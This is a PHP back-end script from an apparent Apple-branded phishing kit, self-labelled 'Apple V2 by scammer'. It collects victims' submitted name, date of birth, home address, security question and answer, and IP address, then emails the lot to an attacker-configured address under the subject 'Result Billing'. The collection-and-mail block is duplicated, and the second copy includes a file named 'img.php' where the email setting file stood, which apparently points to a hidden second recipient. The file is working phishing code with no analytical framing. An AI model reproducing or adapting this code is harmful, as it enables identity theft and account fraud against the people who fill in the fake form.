<? include "../security.php";?>
<?php
ob_start();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "==============| Apple V2 by scammer |===============\n";
$bilsmg .= "Full Name                   : ".$_POST['name-re']."\n";
$bilsmg .= "Date of Birth               : ".$_POST['dob']."/";
$bilsmg .= "".$_POST['dob2']."/";
$bilsmg .= "".$_POST['dob3']."\n";
$bilsmg .= "Street                      : ".$_POST['street']."\n";
$bilsmg .= "City                        : ".$_POST['city-add']."\n";
$bilsmg .= "Zip                         : ".$_POST['zip-add']."\n";
$bilsmg .= "State                       : ".$_POST['state-code']."\n";
include '../put-your-email-here.php';
$bilsmg .= "Country                     : ".$_POST['country-code']."\n";
$bilsmg .= "Question Of Security        : ".$_POST['question-se']."\n";
$bilsmg .= "Reply                       : ".$_POST['reply-qe']."\n";
$bilsmg .= "===============| IP INFO |===============\n";
$bilsmg .= "From  http://www.geoiptool.com/?IP=$ip   \n";
$bilsmg .= "==============| Apple V2 |==============";
$bilsub = "Result Billing | $ip";
$headers = "From: scammer Apple <scammer@scammer.scammer>";
$arr=array($bilsnd, $IP);

mail($mailto,$bilsub,$bilsmg,$headers);
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "==============| Apple V2 by scammer |===============\n";
$bilsmg .= "Full Name                   : ".$_POST['name-re']."\n";
$bilsmg .= "Date of Birth               : ".$_POST['dob']."/";
$bilsmg .= "".$_POST['dob2']."/";
$bilsmg .= "".$_POST['dob3']."\n";
$bilsmg .= "Street                      : ".$_POST['street']."\n";
$bilsmg .= "City                        : ".$_POST['city-add']."\n";
$bilsmg .= "Zip                         : ".$_POST['zip-add']."\n";
$bilsmg .= "State                       : ".$_POST['state-code']."\n";
include '../img.php';
$bilsmg .= "Country                     : ".$_POST['country-code']."\n";
$bilsmg .= "Question Of Security        : ".$_POST['question-se']."\n";
$bilsmg .= "Reply                       : ".$_POST['reply-qe']."\n";
$bilsmg .= "===============| IP INFO |===============\n";
$bilsmg .= "From  http://www.geoiptool.com/?IP=$ip   \n";
$bilsmg .= "==============| Apple V2 |==============";
$bilsub = "Result Billing | $ip";
$headers = "From: scammer Apple <scammer@scammer.scammer>";
$arr=array($bilsnd, $IP);

mail($mailto,$bilsub,$bilsmg,$headers);

include("cssisma/applejava1.php");

?>